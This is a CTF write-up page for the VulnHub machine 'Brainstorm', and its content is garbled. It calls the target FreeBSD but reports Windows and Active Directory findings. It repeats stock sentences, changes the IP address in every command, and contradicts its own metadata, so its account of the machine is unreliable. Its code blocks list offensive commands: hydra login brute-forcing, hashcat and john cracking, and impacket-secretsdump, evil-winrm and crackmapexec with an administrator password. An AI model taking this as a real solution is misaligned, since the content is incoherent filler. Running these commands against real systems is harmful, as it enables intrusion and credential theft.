---
TitleSEO: "VulnHub — Brainstorm (Easy FreeBSD) | ZureFX"
TitlePost: "VulnHub — Brainstorm (Easy FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Brainstorm. Pass the Ticket and SeImpersonatePrivilege to achieve easy compromise on FreeBSD."
Keywords: "ctf, hard, web, forensics, insane, offsec"
URL: "https://zurefx.github.io/writeups/htb-brainstorm-148.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-brainstorm-148/"
Date: "2025-08-18"
Tags: "CTF, Hard, Web, Forensics, Insane, OffSec"
Section: "writeups"
Lang: "en"
main_img: "htb-brainstorm-148"
Permalink: "/writeups/htb-brainstorm-148.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Brainstorm** is rated **Easy** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.71.102.165`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.117.101.79 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.111.140.220/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.73.201 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The application stored sensitive credentials in an unencrypted configuration file. Network traffic analysis revealed unencrypted communications containing user credentials.

### Service Enumeration

Unconstrained delegation was enabled on the compromised machine. Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

### Web Enumeration

The database credentials were hardcoded in the application source code. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Network traffic analysis revealed unencrypted communications containing user credentials. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services.

Key finding: **SeImpersonatePrivilege**.

The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

### Initial Access

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.54.132.202
nmap -sCV -p21,25,22 10.13.23.139 -oN scan.txt
```

The service account had excessive permissions assigned in Active Directory. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

## Privilege Escalation

### Enumeration

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
crackmapexec smb 10.115.93.99 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.83.1.208 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.75.167.142/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.127.60.29 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.29.10.60/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
feroxbuster -h
```

The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `pwncat`
- `smbclient`
- `sharphound`
- `chisel`
- `feroxbuster`
- `john`
- `enum4linux`
- `secretsdump`

### Key Takeaways

- Pass the Ticket
- SeImpersonatePrivilege
